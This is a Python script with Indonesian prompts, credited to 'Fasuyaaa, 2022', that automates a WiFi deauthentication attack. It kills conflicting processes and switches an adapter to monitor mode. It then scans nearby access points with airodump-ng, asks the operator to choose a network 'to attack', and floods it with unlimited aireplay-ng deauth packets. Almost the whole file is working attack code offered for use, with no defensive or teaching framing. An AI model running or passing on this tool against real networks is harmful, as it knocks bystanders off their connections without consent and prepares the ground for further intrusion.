import subprocess
import re
import csv
import os
import time
import shutil
import random
import sys
from datetime import datetime

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
# kecepatan mengetik
        time.sleep(random.random() * 0.1)

def turn(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
# kecepatan mengetik
        time.sleep(random.random() * 1)
     
def end():
    print('PROGRAM SHUTDOWN....')
    print("\n")
    mengetik('MEMBERSIHKAN DATA.....')
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)): 
        time.sleep(0.6)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    print("\n")
    print("PROGRAM OFF")
           
def tanya():
    print("""
> exit. kembali ke main
> stop. hentikan program          
          """)
    pilihan = input("Masukkan Pilihan: ")
    if pilihan == "exit":
        main()
    elif pilihan == "stop":
        end()
    else:
        print("Masukkan Input Yang Sesuai!!!!")
        tanya()
        
active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

turn('PROGRAM TURN ON....')
print("\n")
mengetik('MEMUAT DATA.....')
animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(0.6)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()
print("\n")

def main():
    print(r""" 
░██╗░░░░░░░██╗██████╗░░█████╗░░██████╗
░██║░░██╗░░██║██╔══██╗██╔══██╗██╔════╝
░╚██╗████╗██╔╝██║░░██║██║░░██║╚█████╗░
░░████╔═████║░██║░░██║██║░░██║░╚═══██╗
░░╚██╔╝░╚██╔╝░██████╔╝╚█████╔╝██████╔╝
░░░╚═╝░░░╚═╝░░╚═════╝░░╚════╝░╚═════╝░
    """)
    print("\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
    print("\n< Copyright of Fasuyaaa, 2022                                   >")
    print("\n< https://github.com/Fasuyaaa                                   >")
    print("\n< https://www.instagram.com/dfazyx                              >")
    print("\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")


    if not 'SUDO_UID' in os.environ.keys():
        print("Jalankan program melalui sudo.")
        exit()

    for file_name in os.listdir():
        if ".csv" in file_name:
            print("Seharusnya tidak ada file csv di direktori Anda. Kami menemukan file csv di direktori Anda dan akan memindahkannya ke direktori cadangan.")
   
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Folder backup sudah tersedia.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    wlan_pattern = re.compile("^wlan[0-9]+")

    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print("Sambungkan dengan WIFI adapter dan coba lagi.")
        exit()

    print("WIFI interface yang tersedia:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")

    while True:
        wifi_interface_choice = input("Pilih interface yang ingin digunakan untuk penyerangan: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print("Masukkan nomor yang sesuai dengan pilihan yang tersedia.")

    hacknic = check_wifi_result[int(wifi_interface_choice)]

    print("WiFi adapter tersambung!\nSekarang matikan proses yang bertentangan:")

    print("Mengubah adaptor Wifi ke mode monitor:")
    subprocess.run(["ip", "link", "set", hacknic, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", hacknic, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", hacknic, "up"])

    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open(file_name) as csv_h:
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    pass
                                elif row["BSSID"] == "Station MAC":
                                    break
                                elif check_for_essid(row["ESSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)

            print("Mendeteksi. Tekan Ctrl+C jika ingin memilih jaringan yang akan diserang.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nSiap menunggu pilihan.")

    while True:
        choice = input("Silakan pilih pilihan di atas: ")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Coba lagi.")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
    subprocess.run(["airmon-ng", "start", hacknic, hackchannel])

    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
    except KeyboardInterrupt:
        print("Selesai!")
        tanya()
        
main()
    
